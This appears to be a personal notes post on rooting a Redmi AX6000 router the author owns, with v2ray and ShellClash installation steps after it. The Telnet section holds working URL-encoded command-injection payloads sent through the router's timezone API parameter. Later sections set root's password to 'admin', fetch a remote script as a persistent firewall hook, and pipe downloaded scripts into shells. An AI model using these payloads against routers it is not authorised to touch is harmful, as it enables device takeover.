---
title: redmi ax6000 crack
date: 2023-03-22
tags: [crack]
authors: me
keywords: [crack]
---

## enable Telnet

check http://192.168.31.1, login to the ui

copy the token from the url 

the following url should be further edited, replacing {token} by the string getting frorm the previous step

```sh
# enable debug mode, the page showed {code: 0}, which indicates that everything is ok
http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3B%20zz%3D%24%28dd%20if%3D%2Fdev%2Fzero%20bs%3D1%20count%3D2%202%3E%2Fdev%2Fnull%29%20%3B%20printf%20%27%A5%5A%25c%25c%27%20%24zz%20%24zz%20%7C%20mtd%20write%20-%20crash%20%3B%20

# reboot the router (NB: after reboot the token changed accordingly)
http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3b%20reboot%20%3b%20

# enable telnet permanently, the page showed {code: 0} prove that we success
http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3B%20bdata%20set%20telnet_en%3D1%20%3B%20bdata%20set%20ssh_en%3D1%20%3B%20bdata%20set%20uart_en%3D1%20%3B%20bdata%20commit%20%3B%20

# reboot another once
http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3b%20reboot%20%3b%20

# check if telnet is enabled (no username/passwd needed)
telnet 192.168.31.1 23
```

## enable ssh

```sh
# enter and login the telnet


echo -e 'admin\nadmin' | passwd root  
nvram set ssh_en=1  
nvram set telnet_en=1  
nvram set uart_en=1  
nvram set boot_wait=on  
nvram commit  
sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear  
/etc/init.d/dropbear restart  
mkdir /data/auto_ssh  
cd /data/auto_ssh  
curl -O https://fastly.jsdelivr.net/gh/lemoeo/AX6S@main/auto_ssh.sh  
chmod +x auto_ssh.sh  
uci set firewall.auto_ssh=include  
uci set firewall.auto_ssh.type='script'  
uci set firewall.auto_ssh.path='/data/auto_ssh/auto_ssh.sh'  
uci set firewall.auto_ssh.enabled='1'  
uci commit firewall  
uci set system.@system[0].timezone='CST-8'  
uci set system.@system[0].webtimezone='CST-8'  
uci set system.@system[0].timezoneindex='2.84'  
uci commit  
mtd erase crash  
reboot  

# check if ssh enabled (root / admin)
ssh root@192.168.31.1 
# if error occurred
# Unable to negotiate with 192.168.31.1 port 22: no matching host key type fou
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.31.1
```

## vps 搭建 v2ray

```sh
bash <(wget -qO- -o- https://git.io/v2ray.sh)

# 默认自动创建一个 VMess-TCP 配置

# 若无法正常使用, 尝试
v2ray add ss

# bbr 优化
v2ray bbr

# 进入管理面板, 退出:直接回车
v2ray

# ip
v2ray ip

```


## install shellclash

```sh
sudo -i #切换到root用户，如果需要密码，请输入密码
bash #如已处于bash环境可跳过

#GitHub源(可能需要代理)
export url='https://raw.githubusercontent.com/juewuy/ShellClash/master' && sh -c "$(curl -kfsSl $url/install.sh)" && source /etc/profile &> /dev/null
# or
export url='https://fastly.jsdelivr.net/gh/juewuy/ShellClash@master' && sh -c "$(curl -kfsSl $url/install.sh)" && source /etc/profile &> /dev/null

# 显示安装成功
clash # 进入clash 安装配置向导

# ui dashboard 安装不了, 跳过dashboard, 直接安装 clash
# clash 启动后, 在更新彩灯中安装 ui 即可
# http://clash.razord.top/#/proxies
# http://192.168.31.1:9999/ui/#/proxies




# 本地安装
cd /tmp
curl -O -# -s https://fastly.jsdelivr.net/gh/juewuy/ShellClash@master/bin/ShellClash.tar.gz
mkdir -p /tmp/SC_tmp && tar -zxf '/tmp/ShellClash.tar.gz' -C /tmp/SC_tmp/ && source /tmp/SC_tmp/init.sh 
# or
mkdir -p /tmp/SC_tmp && tar -zxf '/tmp/ShellClash.tar.gz' -C /tmp/SC_tmp/ && bash /tmp/SC_tmp/init.sh && source /etc/profile >/dev/null




# 本地 ui 安装
curl -O -# -s https://raw.github.com/xiaoyureed/rain-cloud/main/clashdb.tar.gz
# scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa dashboard/clashdb.tar.gz root@192.168.31.1:/data/clash/ui
tar -zxf
```

## references


```sh

https://github.com/miaoermua/unlock-redmi-ax6000

https://iii80.com/?action=show&id=1080 , https://qust.me/post/ax6000-shellclash/

https://qust.me/post/ax6000-openwrt/#%E7%AC%AC%E4%BA%8C%E6%AD%A5%E4%BB%8E%E8%BF%87%E6%B8%A1%E5%9B%BA%E4%BB%B6%E5%88%B7%E5%85%A5-openwrt 刷 openwrt
https://zhuanlan.zhihu.com/p/103121214 插件
https://github.com/kenzok8/openwrt-packages 插件

https://github.com/juewuy/ShellClash install scripts
https://qust.me/post/ax6000-shellclash/#%E5%AE%89%E8%A3%85-shellclash
https://github.com/kjfx/AX6000/releases/tag/redmi_ax6000_ssh

https://github.com/loyess/Shell ss shell安装脚本
https://github.com/teddysun/shadowsocks_install
https://github.com/teddysun/shadowsocks_install

https://github.com/openRunner/clash-freenode clash free node
https://github.com/WilliamStar007/ClashX-V2Ray-TopFreeProxy
https://github.com/learnhard-cn/free_proxy_ss

https://github.com/233boy/v2ray one click scripts

https://www.youtube.com/watch?v=KH318DzR7lA
```